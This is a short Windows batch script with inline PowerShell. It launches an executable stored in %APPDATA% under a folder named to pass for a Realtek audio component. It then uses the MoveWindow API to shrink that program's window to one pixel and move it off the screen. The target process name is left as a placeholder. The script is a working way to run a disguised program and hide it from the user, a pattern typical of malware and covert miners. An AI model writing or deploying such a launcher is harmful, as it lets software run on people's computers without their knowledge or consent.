@echo off
start "" "%APPDATA%\HD Realtek Audio Player\Windows64.exe"

timeout /t 2 /nobreak >nul
powershell -Command "& {
    Start-Sleep -Seconds 1;
    $sig = '[DllImport(\"user32.dll\")] public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);';
    add-type -name Win32 -member $sig -namespace Funcs;
    $hwnd = (Get-Process YourProgramName | Where-Object { $_.MainWindowTitle -ne '' }).MainWindowHandle;
    [Funcs.Win32]::MoveWindow($hwnd, 1, 9999, 1, 1, $true)
}"
